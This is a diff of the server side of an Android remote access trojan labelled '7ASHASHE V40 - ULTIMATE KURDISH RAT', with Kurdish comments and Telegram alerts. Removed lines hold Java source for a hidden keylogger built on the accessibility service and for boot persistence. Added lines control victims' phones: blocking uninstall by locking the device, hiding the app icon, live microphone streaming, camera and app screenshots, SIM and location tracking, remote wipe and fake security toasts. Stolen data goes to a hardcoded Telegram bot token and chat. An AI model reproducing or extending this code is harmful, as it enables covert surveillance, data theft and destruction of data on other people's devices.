@@ -1,12 +1,9 @@
 // =====================================================
-// 7ASHASHE V39 - ULTIMATE WILD RAT
+// 7ASHASHE V40 - ULTIMATE KURDISH RAT
 // گەشەپێدەر: 7ASHASHE - وەحشی هاک
-// وەشان: 39.0.0 - UNSTOPPABLE EDITION
+// وەشان: 40.0.0 - ULTIMATE KURDISH
 // =====================================================
 
-// =====================================================
-// 📦 REQUIRE MODULES - لە سەرەتاوە
-// =====================================================
 const express = require('express');
 const WebSocket = require('ws');
 const http = require('http');
@@ -24,7 +21,7 @@ const util = require('util');
 const exec = util.promisify(require('child_process').exec);
 
 // =====================================================
-// 🚀 APP INITIALIZATION - لە سەرەتای کۆد
+// 🚀 APP INITIALIZATION
 // =====================================================
 const app = express();
 const server = http.createServer(app);
@@ -34,22 +31,16 @@ const wss = new WebSocket.Server({ server });
 // 🔐 CREDENTIALS - 7ASHASHE (تۆکنی نوێ)
 // =====================================================
 const CONFIG = {
-    TOKEN: '8530600841:AAEdfh_HMZ8YzOghqeuZNXisZDcV9CfNltw',
+    TOKEN: '8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU',
     CHAT_ID: '5578405082',
     MASTER: '7ASHASHE',
-    VERSION: '39.0.0',
+    VERSION: '40.0.0',
     ENCRYPTION_KEY: crypto.randomBytes(32).toString('hex'),
     SESSION_SECRET: crypto.randomBytes(64).toString('hex'),
     PORT: process.env.PORT || 8080,
     MAX_FILE_SIZE: 100 * 1024 * 1024, // 100MB
     PING_INTERVAL: 30000, // 30 seconds
-    RECONNECT_TIMEOUT: 5000, // 5 seconds
-    AUTO_RESTART: true,
-    BATTERY_OPTIMIZATION_BYPASS: true,
-    ANTI_UNINSTALL: true,
-    PERSISTENT_SERVICE: true,
-    ACCESSIBILITY_SERVICE: true,
-    CAM_SNAPSHOT_ON_LOCK: true
+    RECONNECT_TIMEOUT: 5000 // 5 seconds
 };
 
 // =====================================================
@@ -62,30 +53,19 @@ const bot = new TelegramBot(CONFIG.TOKEN, { polling: true });
 // =====================================================
 const DIRS = {
     DATA: path.join(__dirname, 'data'),
-    PHOTOS: path.join(__dirname, 'data', 'photos'),
-    VIDEOS: path.join(__dirname, 'data', 'videos'),
-    AUDIO: path.join(__dirname, 'data', 'audio'),
-    FILES: path.join(__dirname, 'data', 'files'),
-    CONTACTS: path.join(__dirname, 'data', 'contacts'),
+    PHOTOS: path.join(__dirname, 'data', 'wêne'),
+    VIDEOS: path.join(__dirname, 'data', 'vîdyo'),
+    AUDIO: path.join(__dirname, 'data', 'deng'),
+    FILES: path.join(__dirname, 'data', 'fayl'),
+    CONTACTS: path.join(__dirname, 'data', 'peywendî'),
     SMS: path.join(__dirname, 'data', 'sms'),
-    CALLS: path.join(__dirname, 'data', 'calls'),
-    APPS: path.join(__dirname, 'data', 'apps'),
-    KEYLOGS: path.join(__dirname, 'data', 'keylogs'),
-    CLIPBOARD: path.join(__dirname, 'data', 'clipboard'),
-    LOCATION: path.join(__dirname, 'data', 'location'),
-    SCREENSHOTS: path.join(__dirname, 'data', 'screenshots'),
-    SCREEN_RECORDS: path.join(__dirname, 'data', 'screen_records'),
-    WHATSAPP: path.join(__dirname, 'data', 'whatsapp'),
-    TELEGRAM: path.join(__dirname, 'data', 'telegram'),
-    INSTAGRAM: path.join(__dirname, 'data', 'instagram'),
-    FACEBOOK: path.join(__dirname, 'data', 'facebook'),
-    GMAIL: path.join(__dirname, 'data', 'gmail'),
-    PASSWORDS: path.join(__dirname, 'data', 'passwords'),
-    CRYPTO: path.join(__dirname, 'data', 'crypto'),
-    TWOFA: path.join(__dirname, 'data', '2fa'),
-    RANSOMWARE: path.join(__dirname, 'data', 'ransomware'),
-    DROPPER: path.join(__dirname, 'data', 'dropper'),
-    LOGS: path.join(__dirname, 'data', 'logs'),
+    CALLS: path.join(__dirname, 'data', 'peywendiyekan'),
+    APPS: path.join(__dirname, 'data', 'êpekan'),
+    KEYLOGS: path.join(__dirname, 'data', 'klîk'),
+    CLIPBOARD: path.join(__dirname, 'data', 'klîpbord'),
+    LOCATION: path.join(__dirname, 'data', 'shwên'),
+    SCREENSHOTS: path.join(__dirname, 'data', 'screenshot'),
+    SCREEN_RECORDS: path.join(__dirname, 'data', 'tômari_şashe'),
     NOTIFICATIONS: path.join(__dirname, 'data', 'notifications'),
     SCREEN_STREAMS: path.join(__dirname, 'data', 'screen_streams'),
     CALL_FORWARDING: path.join(__dirname, 'data', 'call_forwarding'),
@@ -114,6 +94,8 @@ if (!fs.existsSync(DIRS.DATABASE)) {
             calls_forwarded: 0,
             messages_spammed: 0,
             cam_snapshots: 0,
+            anti_uninstall_attempts: 0,
+            sim_changes: 0,
             start_time: new Date().toISOString()
         }
     }, null, 2));
@@ -165,338 +147,562 @@ const logToFile = (type, data) => {
 const clients = new Map();
 
 // =====================================================
-// 🚀 FEATURE 1: PERSISTENT AUTO-RESTART
+// 🚀 1. سیستمی دژە-سڕینەوە (Anti-Uninstall)
 // =====================================================
-const setupAutoRestart = () => {
-    if (!CONFIG.AUTO_RESTART) return;
-    
-    const restartScript = `
-        // Android auto-restart script
-        public class AutoRestartReceiver extends BroadcastReceiver {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
-                    Intent serviceIntent = new Intent(context, MainService.class);
-                    context.startService(serviceIntent);
-                }
-            }
-        }
-        
-        // Keep alive service
-        public class KeepAliveService extends Service {
-            @Override
-            public int onStartCommand(Intent intent, int flags, int startId) {
-                // Start as foreground service to prevent killing
-                Notification notification = new Notification.Builder(this)
-                    .setContentTitle("System Service")
-                    .setContentText("Running")
-                    .build();
-                startForeground(1, notification);
-                return START_STICKY;
-            }
-        }
-    `;
-    
-    fs.writeFileSync(path.join(DIRS.DROPPER, 'AutoRestartReceiver.java'), restartScript);
-    console.log('✅ Auto-Restart module installed');
-};
-
-// =====================================================
-// 🚀 FEATURE 2: PERSISTENT SERVICE (نەبڕاوە)
-// =====================================================
-const setupPersistentService = () => {
-    if (!CONFIG.PERSISTENT_SERVICE) return;
-    
-    const persistentScript = `
-        // Android persistent service
-        public class PersistentService extends Service {
-            private static final String TAG = "PersistentService";
-            
-            @Override
-            public void onCreate() {
-                super.onCreate();
-                startForegroundService();
-                startAlarmManager();
-            }
-            
-            private void startForegroundService() {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    NotificationChannel channel = new NotificationChannel(
-                        "persistent_channel",
-                        "Persistent Service",
-                        NotificationManager.IMPORTANCE_LOW
-                    );
-                    NotificationManager manager = getSystemService(NotificationManager.class);
-                    manager.createNotificationChannel(channel);
-                    
-                    Notification notification = new Notification.Builder(this, "persistent_channel")
-                        .setContentTitle("System Service")
-                        .setContentText("Running")
-                        .setSmallIcon(android.R.drawable.ic_dialog_info)
-                        .build();
-                    
-                    startForeground(2, notification);
-                }
-            }
-            
-            private void startAlarmManager() {
-                AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
-                Intent intent = new Intent(this, RestartReceiver.class);
-                PendingIntent pendingIntent = PendingIntent.getBroadcast(
-                    this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT
-                );
-                
-                // Restart every 5 minutes if killed
-                alarmManager.setRepeating(
-                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    SystemClock.elapsedRealtime() + 300000,
-                    300000,
-                    pendingIntent
-                );
-            }
-            
-            @Override
-            public int onStartCommand(Intent intent, int flags, int startId) {
-                return START_STICKY;
-            }
-        }
-        
-        public class RestartReceiver extends BroadcastReceiver {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                context.startService(new Intent(context, PersistentService.class));
-            }
-        }
-    `;
-    
-    fs.writeFileSync(path.join(DIRS.DROPPER, 'PersistentService.java'), persistentScript);
-    console.log('✅ Persistent Service module installed');
-};
-
-// =====================================================
-// 🚀 FEATURE 3: ACCESSIBILITY SERVICE EXPLOITATION
-// =====================================================
-const setupAccessibilityService = () => {
-    if (!CONFIG.ACCESSIBILITY_SERVICE) return;
-    
-    const accessibilityScript = `
-        // Android Accessibility Service
-        public class KeyloggerAccessibilityService extends AccessibilityService {
-            private static final String TAG = "KeyloggerService";
-            
-            @Override
-            public void onAccessibilityEvent(AccessibilityEvent event) {
-                switch (event.getEventType()) {
-                    case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                        String text = event.getText().toString();
-                        if (text != null && !text.isEmpty()) {
-                            sendToServer(text);
-                        }
-                        break;
-                        
-                    case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                        // Track clicks
-                        break;
-                        
-                    case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
-                        String packageName = event.getPackageName() != null ? 
-                            event.getPackageName().toString() : "unknown";
-                        sendToServer("Window changed: " + packageName);
-                        break;
-                }
-            }
-            
-            private void sendToServer(String data) {
-                // Send to our server via HTTP
-                new Thread(() -> {
-                    try {
-                        OkHttpClient client = new OkHttpClient();
-                        RequestBody body = new FormBody.Builder()
-                            .add("type", "accessibility")
-                            .add("data", data)
-                            .add("timestamp", String.valueOf(System.currentTimeMillis()))
-                            .build();
-                        
-                        Request request = new Request.Builder()
-                            .url("https://your-server.com/api/accessibility")
-                            .post(body)
-                            .build();
-                        
-                        client.newCall(request).execute();
-                    } catch (Exception e) {}
-                }).start();
-            }
-            
-            @Override
-            public void onInterrupt() {}
-            
-            @Override
-            public void onServiceConnected() {
-                super.onServiceConnected();
-                sendToServer("Accessibility service connected");
-            }
-        }
-        
-        // XML configuration for accessibility service
-        // <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-        //     android:description="@string/accessibility_service_description"
-        //     android:accessibilityEventTypes="typeAllMask"
-        //     android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows"
-        //     android:canRetrieveWindowContent="true"
-        //     android:canRequestTouchExplorationMode="true"
-        //     android:settingsActivity=".MainActivity" />
-    `;
-    
-    fs.writeFileSync(path.join(DIRS.DROPPER, 'KeyloggerAccessibilityService.java'), accessibilityScript);
-    console.log('✅ Accessibility Service module installed');
-};
-
-// =====================================================
-// 🚀 FEATURE 4: CAM SNAPSHOT ON LOCK
-// =====================================================
-class CamSnapshotOnLock {
+class AntiUninstall {
     constructor() {
-        this.snapshots = [];
-        this.active = CONFIG.CAM_SNAPSHOT_ON_LOCK;
+        this.uninstallAttempts = new Map();
     }
 
-    captureOnUnlock(clientId) {
-        if (!this.active) return;
-        
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `📸 **Cam Snapshot on Unlock**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `⚡ Capturing front camera...`,
-            { parse_mode: 'Markdown' }
-        );
+    async handleUninstallAttempt(clientId) {
+        const attempts = this.uninstallAttempts.get(clientId) || 0;
+        this.uninstallAttempts.set(clientId, attempts + 1);
         
         const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (!client) return;
+
+        // قفڵکردنی مۆبایلەکە
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
-                type: 'capture_on_unlock',
+                type: 'lock_device',
+                reason: 'uninstall_attempt',
                 timestamp: Date.now()
             }));
         }
-    }
 
-    saveSnapshot(clientId, imageData) {
-        const filename = `unlock_${clientId.substring(0, 8)}_${Date.now()}.jpg`;
-        const filepath = path.join(DIRS.CAM_SNAPSHOTS, filename);
-        
-        const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, '');
-        fs.writeFileSync(filepath, base64Data, 'base64');
-        
-        this.snapshots.push({
-            clientId,
-            filename,
-            timestamp: new Date().toISOString()
-        });
-        
+        // ناردنی ئاگاداری بۆ تێلیگرام
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🚫 **⚠️ دژە-سڕینەوە**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `🔢 ژمارەی هەوڵ: ${attempts + 1}\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
+            `✅ مۆبایلەکە قفڵ کرا`,
+            { parse_mode: 'Markdown' }
+        );
+
+        // نوێکردنەوەی ئامارەکان
         const db = readDB();
-        db.stats.cam_snapshots++;
+        db.stats.anti_uninstall_attempts++;
         writeDB(db);
-        
-        bot.sendPhoto(CONFIG.CHAT_ID, Buffer.from(base64Data, 'base64'), {
-            caption: `📸 **Unlock Snapshot**\n\n` +
-                    `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-                    `⏰ Time: ${new Date().toLocaleString()}`,
-            parse_mode: 'Markdown'
-        });
     }
 }
 
-const camSnapshotOnLock = new CamSnapshotOnLock();
+const antiUninstall = new AntiUninstall();
 
-// API endpoint for cam snapshot
-app.post('/api/cam/snapshot', (req, res) => {
-    const { clientId, image } = req.body;
-    camSnapshotOnLock.saveSnapshot(clientId, image);
+// API endpoint for uninstall attempts
+app.post('/api/anti-uninstall', (req, res) => {
+    const { clientId } = req.body;
+    antiUninstall.handleUninstallAttempt(clientId);
     res.json({ success: true });
 });
 
 // =====================================================
-// 🚀 FEATURE 5: REMOTE FILE EXPLORER
+// 🚀 2. شاردنەوەی ئایکۆن (Icon Hider)
 // =====================================================
-class RemoteFileExplorer {
+class IconHider {
     constructor() {
-        this.activeSessions = new Map();
+        this.hiddenIcons = new Map();
     }
 
-    listFiles(clientId, path = '/') {
-        bot.sendMessage(CONFIG.CHAT_ID,
-            `📁 **File Explorer**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `📂 Path: ${path}\n` +
-            `⚡ Fetching...`,
-            { parse_mode: 'Markdown' }
-        );
-        
+    async hideIcon(clientId) {
         const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (!client) return;
+
+        // ناردنی فەرمان بۆ شاردنەوەی ئایکۆن
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
-                type: 'list_files',
-                path,
-                sessionId: uuidv4(),
+                type: 'hide_icon',
                 timestamp: Date.now()
             }));
         }
-    }
 
-    downloadFile(clientId, filePath) {
+        this.hiddenIcons.set(clientId, true);
+
         bot.sendMessage(CONFIG.CHAT_ID,
-            `📥 **Downloading File**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `📄 Path: ${filePath}\n` +
-            `⚡ Downloading...`,
+            `👁️ **🔒 ئایکۆن شاردرایەوە**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
+            `✅ ئایکۆن لە لیستی ئەپەکان ون بوو`,
             { parse_mode: 'Markdown' }
         );
-        
+    }
+
+    async showIcon(clientId) {
         const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.send(JSON.stringify({
-                type: 'download_file',
-                path: filePath,
+                type: 'show_icon',
                 timestamp: Date.now()
             }));
         }
-    }
 
-    deleteFile(clientId, filePath) {
+        this.hiddenIcons.delete(clientId);
+
         bot.sendMessage(CONFIG.CHAT_ID,
-            `🗑️ **Deleting File**\n\n` +
-            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
-            `📄 Path: ${filePath}`,
+            `👁️ **🔓 ئایکۆن دەرکەوتەوە**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
             { parse_mode: 'Markdown' }
         );
-        
-        const client = clients.get(clientId);
-        if (client && client.ws.readyState === WebSocket.OPEN) {
-            client.ws.send(JSON.stringify({
-                type: 'delete_file',
-                path: filePath,
-                timestamp: Date.now()
-            }));
-        }
     }
 }
 
-const remoteFileExplorer = new RemoteFileExplorer();
+const iconHider = new IconHider();
 
-// API endpoint for file listing
-app.post('/api/files/list', (req, res) => {
-    const { clientId, path, files } = req.body;
-    
-    let fileList = '📁 **File List**\n\n';
-    files.forEach(f => {
-        fileList += `${f.type === 'dir' ? '📂' : '📄'} ${f.name} - ${f.size || ''}\n`;
+// =====================================================
+// 🚀 3. گوێگرتنی ڕاستەوخۆ (Live Audio Streaming)
+// =====================================================
+class LiveAudioStream {
+    constructor() {
+        this.activeStreams = new Map();
+    }
+
+    async startAudioStream(clientId, duration = 60) { // duration لە چرکە
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        const streamId = uuidv4();
+        
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'start_audio_stream',
+                streamId,
+                duration,
+                timestamp: Date.now()
+            }));
+        }
+
+        this.activeStreams.set(streamId, {
+            clientId,
+            startedAt: new Date().toISOString(),
+            duration,
+            active: true
+        });
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🎤 **🔴 گوێگرتنی ڕاستەوخۆ**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `⏱️ ماوە: ${duration} چرکە\n` +
+            `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'Markdown' }
+        );
+
+        return streamId;
+    }
+
+    async stopAudioStream(streamId) {
+        const stream = this.activeStreams.get(streamId);
+        if (!stream) return;
+
+        const client = clients.get(stream.clientId);
+        if (client && client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'stop_audio_stream',
+                streamId,
+                timestamp: Date.now()
+            }));
+        }
+
+        stream.active = false;
+        this.activeStreams.delete(streamId);
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🎤 **⏹️ گوێگرتنی ڕاستەوخۆ وەستا**\n\n` +
+            `🆔 Stream: ${streamId.substring(0, 8)}...\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+}
+
+const liveAudioStream = new LiveAudioStream();
+
+// API endpoint for audio stream data
+app.post('/api/audio-stream', upload.single('audio'), (req, res) => {
+    const { streamId } = req.headers;
+    const { buffer } = req.file;
+
+    bot.sendAudio(CONFIG.CHAT_ID, buffer, {
+        caption: `🎤 **پارچەی دەنگ**\n\n🆔 Stream: ${streamId.substring(0, 8)}...`,
+        parse_mode: 'Markdown'
     });
-    
-    bot.sendMessage(CONFIG.CHAT_ID, fileList, { parse_mode: 'Markdown' });
+
     res.json({ success: true });
 });
 
 // =====================================================
-// 🚀 FEATURE 6: NOTIFICATION LISTENER
+// 🚀 4. سکرینشۆتی زیرەک (Smart Screenshot)
+// =====================================================
+class SmartScreenshot {
+    constructor() {
+        this.monitoredApps = new Map();
+    }
+
+    async monitorApp(clientId, appName) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'monitor_app',
+                app: appName,
+                timestamp: Date.now()
+            }));
+        }
+
+        this.monitoredApps.set(`${clientId}:${appName}`, true);
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📸 **👁️ چاودێری ئەپ**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `📱 ئەپ: ${appName}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
+            `✅ کاتێک ئەپەکە بکرێتەوە، سکرینشۆت دەگیرێت`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+
+    async stopMonitoring(clientId, appName) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'stop_monitoring',
+                app: appName,
+                timestamp: Date.now()
+            }));
+        }
+
+        this.monitoredApps.delete(`${clientId}:${appName}`);
+    }
+}
+
+const smartScreenshot = new SmartScreenshot();
+
+// =====================================================
+// 🚀 5. کۆنترۆڵی کامێرا (Camera Flash Control)
+// =====================================================
+class CameraFlashControl {
+    constructor() {
+        this.activeFlash = new Map();
+    }
+
+    async takePhoto(clientId, camera = 'back', flash = false) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'take_photo',
+                camera,
+                flash,
+                timestamp: Date.now()
+            }));
+        }
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📸 **📸 وێنەگرتن**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `📷 کامێرا: ${camera === 'back' ? 'پشت' : 'پێش'}\n` +
+            `⚡ فلاش: ${flash ? 'بەڵێ' : 'نەخێر'}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+
+    async toggleFlash(clientId, enable) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'toggle_flash',
+                enable,
+                timestamp: Date.now()
+            }));
+        }
+
+        this.activeFlash.set(clientId, enable);
+    }
+}
+
+const cameraFlashControl = new CameraFlashControl();
+
+// =====================================================
+// 🚀 6. دژە-باتری (Battery Bypass)
+// =====================================================
+class BatteryBypass {
+    constructor() {
+        this.bypassActive = new Map();
+    }
+
+    async enableBypass(clientId) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'enable_battery_bypass',
+                timestamp: Date.now()
+            }));
+        }
+
+        this.bypassActive.set(clientId, true);
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🔋 **⚡ دژە-باتری چالاک کرا**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
+            `✅ سیستەمی پاشەکەوتکردنی وزە ناچالاک کرا`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+
+    async disableBypass(clientId) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'disable_battery_bypass',
+                timestamp: Date.now()
+            }));
+        }
+
+        this.bypassActive.delete(clientId);
+    }
+}
+
+const batteryBypass = new BatteryBypass();
+
+// =====================================================
+// 🚀 7. ئاگاداری سیمکارت (SIM Change Alert)
+// =====================================================
+class SimChangeAlert {
+    constructor() {
+        this.simInfo = new Map();
+    }
+
+    async handleSimChange(clientId, newSimInfo) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        const oldSim = this.simInfo.get(clientId);
+
+        this.simInfo.set(clientId, newSimInfo);
+
+        // وەرگرتنی شوێن
+        let location = 'نەزانراو';
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'get_location',
+                timestamp: Date.now()
+            }));
+        }
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📱 **⚠️ گۆڕینی سیمکارت**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `📱 سیمی نوێ: ${newSimInfo.number || 'نەزانراو'}\n` +
+            `📡 کەریەر: ${newSimInfo.carrier || 'نەزانراو'}\n` +
+            `🌍 شوێن: ${location}\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'Markdown' }
+        );
+
+        const db = readDB();
+        db.stats.sim_changes++;
+        writeDB(db);
+    }
+}
+
+const simChangeAlert = new SimChangeAlert();
+
+// API endpoint for sim change
+app.post('/api/sim-change', (req, res) => {
+    const { clientId, simInfo } = req.body;
+    simChangeAlert.handleSimChange(clientId, simInfo);
+    res.json({ success: true });
+});
+
+// =====================================================
+// 🚀 8. سڕینەوەی داتا (Remote Wipe)
+// =====================================================
+class RemoteWipe {
+    constructor() {
+        this.wipeInProgress = new Map();
+    }
+
+    async wipeData(clientId, wipeType = 'all') {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `💥 **⚠️ سڕینەوەی داتا**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `📋 جۆر: ${wipeType === 'all' ? 'هەموو داتاکان' : 'تەنها وێنە'}\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
+            `✅ دەستپێکردنی سڕینەوە...`,
+            { parse_mode: 'Markdown' }
+        );
+
+        this.wipeInProgress.set(clientId, {
+            type: wipeType,
+            startedAt: new Date().toISOString()
+        });
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'wipe_data',
+                wipeType,
+                timestamp: Date.now()
+            }));
+        }
+
+        // پاککردنەوەی داتاکانی سێرڤەر
+        setTimeout(() => {
+            this.wipeInProgress.delete(clientId);
+        }, 60000);
+    }
+
+    async wipePhotos(clientId) {
+        await this.wipeData(clientId, 'photos');
+    }
+
+    async wipeAll(clientId) {
+        await this.wipeData(clientId, 'all');
+    }
+}
+
+const remoteWipe = new RemoteWipe();
+
+// =====================================================
+// 🚀 9. پەیامی ساختە (Fake Toast)
+// =====================================================
+class FakeToast {
+    constructor() {
+        this.toasts = new Map();
+    }
+
+    async sendToast(clientId, message, duration = 3000) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'show_toast',
+                message,
+                duration,
+                timestamp: Date.now()
+            }));
+        }
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `📱 **💬 پەیامی ساختە نێردرا**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `📝 پەیام: ${message}\n` +
+            `⏱️ ماوە: ${duration}ms\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+
+    async sendUpdateToast(clientId) {
+        await this.sendToast(clientId, '⚠️ سیستم پێویستی بە نوێکردنەوەیە. تکایە نوێ بکەوە', 5000);
+    }
+
+    async sendSecurityToast(clientId) {
+        await this.sendToast(clientId, '🔒 دۆزینەوەی هەوڵی دزینی زانیاری. تکایە وەڵام بدەرەوە', 5000);
+    }
+}
+
+const fakeToast = new FakeToast();
+
+// =====================================================
+// 🚀 10. سیستمی ڕیستارت (Auto-Boot)
+// =====================================================
+class AutoBoot {
+    constructor() {
+        this.bootEnabled = new Map();
+    }
+
+    async enableAutoBoot(clientId) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'enable_auto_boot',
+                timestamp: Date.now()
+            }));
+        }
+
+        this.bootEnabled.set(clientId, true);
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🔄 **⚡ سیستمی ڕیستارت چالاک کرا**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
+            `✅ دوای هەر کوژانەوەیەک، ئەپەکە خۆکارانە دەست پێ دەکاتەوە`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+
+    async disableAutoBoot(clientId) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({
+                type: 'disable_auto_boot',
+                timestamp: Date.now()
+            }));
+        }
+
+        this.bootEnabled.delete(clientId);
+    }
+
+    async handleBootComplete(clientId) {
+        const client = clients.get(clientId);
+        if (!client) return;
+
+        bot.sendMessage(CONFIG.CHAT_ID,
+            `🔄 **✅ ئامێر دووبارە بووەوە**\n\n` +
+            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
+            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n` +
+            `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
+            `✅ ئەپەکە خۆکارانە دەستی پێ کردەوە`,
+            { parse_mode: 'Markdown' }
+        );
+    }
+}
+
+const autoBoot = new AutoBoot();
+
+// API endpoint for boot complete
+app.post('/api/boot-complete', (req, res) => {
+    const { clientId } = req.body;
+    autoBoot.handleBootComplete(clientId);
+    res.json({ success: true });
+});
+
+// =====================================================
+// 🚀 NOTIFICATION LISTENER (لە V39ەوە)
 // =====================================================
 class NotificationListener {
     constructor() {
@@ -512,35 +718,27 @@ class NotificationListener {
     captureNotification(notification) {
         const notif = {
             id: uuidv4(),
-            app: notification.app || 'unknown',
+            app: notification.app || 'نەزانراو',
             title: notification.title || '',
             text: notification.text || '',
-            timestamp: new Date().toISOString(),
-            priority: notification.priority || 'normal',
-            icon: notification.icon || null
+            timestamp: new Date().toISOString()
         };
         
         this.notifications.push(notif);
         
-        // Save to file
